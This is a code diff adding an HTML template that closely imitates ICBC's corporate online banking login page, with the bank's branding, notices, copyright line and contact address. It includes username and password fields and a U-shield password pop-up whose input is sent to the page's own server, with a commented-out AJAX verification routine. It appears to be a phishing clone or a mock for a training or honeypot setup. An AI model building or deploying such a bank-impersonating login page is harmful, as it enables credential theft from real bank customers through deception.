@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>中国工商银行企业网上银行</title>
+    <script src="/static/js/jquery.min.js"></script>
+    <style>
+        *{
+            text-decoration: none;
+            list-style: none;
+            color: #000;
+        }
+        .table-top{
+            width: 889px;
+            border: 0;
+        }
+        table{
+            white-space: normal;
+            line-height: normal;
+            font-weight: normal;
+            font-size: medium;
+            font-style: normal;
+            text-align: start;
+            font-variant: normal;
+        }
+        td{
+            font-family: 宋体;
+            font-size: 12px;
+            color: rgb(0, 0, 0);
+            text-decoration: none;
+        }
+        .table-top a:hover{
+            font-size: 12px;
+            color: #BC001F;
+            text-decoration: underline;
+        }
+        /*工商logo*/
+        .icbc-logo {
+            width: 100%;
+            height: 100%;
+            background: url(/static/img/icbc-logo.png) no-repeat;
+        }
+        /*下面部分*/
+        .table-middle{
+            width: 889px;
+            border: 0;
+        }
+        #mainArea {
+            width: 889px;
+            height: 539px;
+            position: relative;
+            /* margin: 0px auto; */
+            background: url(/static/img/main-area.png) center no-repeat;
+        }
+        #mainContent {
+            width: 889px;
+            height: 539px;
+            position: relative;
+            top: 8px;
+            left: 3px;
+        }
+        #leftArea {
+            float: left;
+            width: 525px;
+            height: 527px;
+            position: relative;
+            padding: 0;
+            /* border: 1px solid #ccc; */
+            top: -3px;
+            left: 2px;
+            box-sizing: border-box;
+        }
+        .adArea ul {
+            list-style-type: none;
+            margin: 0px;
+            padding: 0px;
+        }
+        .adArea img{
+            border-style: none;
+            width: 520px;
+            height: 315px;
+        }
+        .main-tip{
+            position: relative;
+            width: 470px;
+            height: 110px;
+            line-height: 2;
+            FONT-SIZE: 12px;
+            color: #323232;
+            font-family: Microsoft yahei;
+            margin: 15px 0 0 23px;
+        }
+        #rightArea {
+            float: left;
+            width: 348px;
+            height: 517px;
+            top: 8px;
+            left: 6px;
+            padding: 0;
+            position: relative;
+        }
+        #loginArea {
+            width: 340px;
+            height: 520px;
+            position: relative;
+            float: left;
+            margin-left: 1px;
+        }
+        #certLoginContent {
+            width: 340px;
+            height: 216px;
+            position: relative;
+            font-family: Microsoft yahei;
+            /* border: 1px solid #dcdcdc; */
+            /* box-sizing: border-box; */
+            background: url(/static/img/logon-area3.png) top left no-repeat;
+        }
+        #loginContent{
+            margin-top: 20px;
+            background: url(/static/img/logon-area3.png) top left no-repeat;
+        }
+        form {
+            margin-block-end: 1em;
+        }
+        .login-title {
+            height: 25px;
+            font-size: 16px;
+            position: relative;
+            font-weight: bold;
+            color: #323232;
+            /* margin: 10px 8px 30px 8px; */
+            font-family: Microsoft yahei;
+            margin: 0;
+            /*padding: 4px,0,7px,20px;*/
+            /* background-color: #DCDCDC; */
+        }
+        .input-area-btn {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .clickable-btn {
+            background: url(/static/img/login-btn.png) center center no-repeat;
+            margin-left: 45px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .input-btn-wrapper1 {
+            width: 250px;
+            height: 36px;
+            line-height: 35px;
+            margin-top: 40px;
+            /* background-color: #c7000B; */
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
+            font-family: Microsoft yahei;
+        }
+        .logon_assist_tips {
+            font-size: 14px;
+            font-weight: bold;
+            text-align: left;
+            color: #323232;
+            margin-top: 8px;
+            margin-left: 23px;
+            margin-right: 23px;
+            font-family: Microsoft yahei;
+        }
+        .logon_assist_tips_link {
+            font-size: 14px;
+            font-weight: bold;
+            color: #0000ff;
+        }
+        .certTip {
+            font-size: 14px;
+            text-align: center;
+            color: #323232;
+            margin-top: 10px;
+            font-family: Microsoft yahei;
+        }
+        .reset-link {
+            margin-top: 10px;
+            text-align: center;
+        }
+        .reset-link-item{
+            color: #053fdc;
+        }
+        .login-title {
+            height: 25px;
+            font-size: 16px;
+            position: relative;
+            font-weight: bold;
+            color: #323232;
+            /* margin: 10px 8px 30px 8px; */
+            font-family: Microsoft yahei;
+            margin: 0;
+            /*padding: 4px,0,7px,20px;*/
+            /* background-color: #DCDCDC; */
+        }
+        .login-frame {
+            width: 100%;
+            height: 100%;
+            margin: 0 1 9 1;
+            border: 0;
+            background-color: white;
+        }
+        /*from表单*/
+        .input-area {
+            position: relative;
+            height: 36px;
+            overflow: hidden;
+            padding-left: 34px;
+            margin: 10px 0 0 11px;
+        }
+        .username {
+            margin-top: 20px;
+            background: url(/static/img/username.png) center left no-repeat;
+        }
+        .password {
+            margin-top: 20px;
+            background: url(/static/img/password.png) center left no-repeat;
+        }
+        .place-holder {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 14px;
+            line-height: 16px;
+            color: #000;
+            cursor: text;
+        }
+        .place-holder-alias {
+            color: #8D8686;
+        }
+
+        .input-wrapper-uin {
+            height: 36px;
+            width: 250px;
+            /* float: left; */
+            position: relative;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            margin-right: 1px;
+        }
+        .input-style {
+            width: 246px;
+            position: relative;
+            top: 4px;
+            left: 2px;
+            height: 20px;
+            line-height: normal;
+            border: none;
+            background: none;
+            font-size: 16px;
+            outline: none;
+        }
+        /*U盾登录*/
+        #U_motai{
+            display: none;
+            position: fixed;
+            width: 310px;
+            height: 145px;
+            top: 175px;
+            left: 495px;
+            {#background-color: blue;#}
+        }
+        .top_mima{
+            position: relative;
+            height: 20px;
+            width: 100%;
+            background-color: #fefefd;
+        }
+        .top_mima span{
+            position: absolute;
+            top: 0;
+            left: 20px;
+        }
+        .top_mima img{
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+        .bottom_mima{
+            background-color: #f9f9f9;
+            width: 100%;
+            height: 125px;
+        }
+        .mid_main{
+            width: 85%;
+            height: 100%;
+            margin: 0 auto;
+            padding-top: 7px;
+            {#border: 1px solid red;#}
+        }
+
+
+    </style>
+</head>
+<body>
+    <!--logo-->
+    <table class="table-top" align="center" >
+            <tbody>
+                <tr>
+                        <td align="right" width="350">&nbsp</td>
+                        <td width="600" height="25">
+                            <table width="25%" border="0" align="right" cellspacing="0" cellpadding="0">
+                                <tbody>
+                                    <tr><td height="5" colspan="3"></td></tr>
+                                    <tr>
+                                        <td width="40%" nowrap align="center">
+                                            <a href="">工作首页</a>
+                                        </td>
+                                        <td width="10%">|</td>
+                                        <td width="45%" nowrap align="right">
+                                            <a href="">个人网上银行</a>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </td>
+                    </tr>
+                <!--工商logo-->
+                <tr>
+                    <td height="61" colspan="2">
+                        <div class="icbc-logo"></div>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    <!--正文-->
+    <table class="table-middle" align="center" cellpadding="0" cellspacing="0" border="0">
+        <tbody>
+            <tr>
+                <td>
+                    <div id="mainArea">
+                        <div id="mainContent">
+<!--                        左侧广告区域-->
+                            <div id="leftArea">
+                                <div class="adArea" style="display: block;">
+                                    <ul id="adUl">
+                                        <li>
+                                            <img src="/static/img/7496735048.jpg" alt="">
+                                        </li>
+                                    </ul>
+
+                                </div>
+<!--                            提示语-->
+                                <div class="main-tip">
+
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果您已成功注册我行金融@家对公网上银行，并申领了U盾，请插入U盾，然后点击"企业网银"下的"U盾登录"按钮。
+                                    如果您申领了普通卡证书或财智账户卡，请点击"企业网银普及版"下的"登录"按钮。<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对公网上银行，为您提供便捷的在线账务查询与对账、支付结算、代发工资、贷款融资、电子票据、现金管理等服务，是您全天候的金融合作伙伴。
+                                    <br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;请不要在网吧等公共场所使用本系统；每次使用企业网上银行服务后，请选择"退出登录"。
+
+
+                                </div>
+<!--                            安全提示-->
+<!--                            其他链接-->
+                                <div class="other-link"></div>
+                            </div>
+<!--                        右侧登录区域-->
+                            <div id="rightArea">
+                                <div id="loginArea">
+                                    <div id="certLoginContent">
+                                        <p class="login-title">企业网银</p>
+                                        <form name="certForm" method="post" action=""></form>
+                                        <div class="input-area-btn">
+                                            <div id="usubmitkey" class="input-btn-wrapper1 clickable-btn">U 盾 登 录</div>
+                                        </div>
+<!--                                       U盾登录框-->
+                                        <div id="U_motai">
+                                            <div class="top_mima">
+                                                <img src="/static/img/little_logo.png" alt="" style="width: 20px;height: 20px;">
+                                                <span>校验U盾密码</span>
+                                                <img src="/static/img/guanbi.png" alt="" style="position:absolute;top: 0;right: 0;">
+                                            </div>
+                                            <div class="bottom_mima">
+                                                <div class="mid_main">
+
+                                                    <p>请输入6-30位的U盾密码</p>
+                                                    <img id="cha" src="/static/img/password.png" alt="" style="position: absolute;top: 67px;left: 260px">
+                                                    <form action="" method="post">
+                                                        {% csrf_token %}
+                                                        <input id="u_password" name="u_password" type="password" style="width: 230px;height: 15px;">
+
+                                                        <input  id="assure" type="submit" style="margin-left: 72px;margin-top: 8px" value="确定" >
+                                                        <input id="cancel_button" type="submit" style="margin-left: 20px" value="取消">
+                                                    </form>
+
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="logon_assist_tips">
+
+                                            建议您下载并使用<a href="" class="logon_assist_tips_link">网银助手</a>，用于安装证书驱动及网络安全控件。为确保您的使用体验，请使用IE8以上版本浏览器登陆
+                                        </div>
+                                        <div class="certTip"></div>
+                                        <div class="reset-link">
+                                            <a href="" class="reset-link-item">热点解答</a>
+                                        </div>
+                                    </div>
+                                    <div id="loginContent">
+                                        <p class="login-title">企业网银普及版</p>
+<!--                                        <iframe id="pwd_login_iframe" name="pwd_login_iframe" class="login-frame" src="https://corporbank-simp.icbc.com.cn/ebankc/normalbank/secforward.jsp?from=nmbklogon" frameborder="0" scrolling="no"></iframe>-->
+                                        <form action="">
+<!--                                        用户名-->
+                                            <div class="input-area username">
+                                                <div class="input-wrapper-uin">
+                                                    <label class="place-holder place-holder-alias" for="logonCardNum">卡号/用户名/关系账户</label>
+                                                    <input id="logonCardNum" type="text" class="input-style" name="CardNum" size="19" maxlength="19">
+                                                </div>
+                                            </div>
+<!--                                        密码-->
+                                            <div class="input-area password">
+                                                <div class="input-wrapper-uin">
+                                                    <label class="place-holder place-holder-alias" for="logonCardNum">密码</label>
+                                                    <input id="logonCardPwd" type="text" class="input-style" name="CardNum" size="19" maxlength="19">
+                                                </div>
+                                            </div>
+<!--                                        验证码-->
+                                            <div class="input-area">
+                                                <img style="margin-left: -32px;margin-top: 1px" src="/static/img/erweima.png" alt="">
+                                            </div>
+<!--                                        用户名登录按钮-->
+                                            <div class="input-area-btn" style="margin-top: 3px">
+                                                <div id="submitkey"  class="input-btn-wrapper1 clickable-btn">登 录</div>
+                                            </div>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </td>
+            </tr>
+            <tr><td height="50px">&nbsp;</td></tr>
+            <tr valign="top">
+		<td>
+			<table width="100%" border="0" cellspacing="0" cellpadding="0">
+				<tbody><tr align="center">
+					<td colspan="3">
+					重要提示：如果您是第一次在本计算机上使用网上银行，请按照<a href="" style="color: #053fdc">系统设置指南</a>进行必要的设置。
+					</td>
+				</tr>
+				<tr align="center">
+					<td height="40" colspan="3">请与我们联系 <a href="mailto:webmaster@icbc.com.cn" style="color: #053fdc">webmaster@icbc.com.cn</a>
+					中国工商银行版权所有</td>
+				</tr>
+			</tbody></table>
+		</td>
+	</tr>
+        </tbody>
+    </table>
+</body>
+<script src="/static/js/jquery.min.js"></script>
+<script>
+    $(function () {
+        $("#usubmitkey").on("click", function () {
+                document.getElementById("U_motai").style.display = "block"
+
+            });
+        $("#cha").on("click", function () {
+                document.getElementById("U_motai").style.display = "none"
+
+            });
+        $("#cancel_button").on("click", function () {
+                document.getElementById("U_motai").style.display = "none"
+
+            });
+        {#$("#assure").on("click", function () {#}
+        {#        u_password = document.getElementById("u_password").valueOf().value#}
+        {#        pass = {'u_password':u_password}#}
+        {#        $.ajax({#}
+        {#            url:'/u_login_verify',#}
+        {#            data:pass,#}
+        {#            success:function (data) {#}
+        {#                alert(data)#}
+        {#                if (data.indexOf("welcome")>-1){#}
+        {#                    window.location = '/welcome'#}
+        {#                }else{#}
+        {#                    window.location = '/ee_login'#}
+        {#                }#}
+        {##}
+        {#            },#}
+        {#            error:function (data) {#}
+        {##}
+        {#            }#}
+        {##}
+        {#        })#}
+        {##}
+        {#    });#}
+
+    })
+</script>
+
+</html>
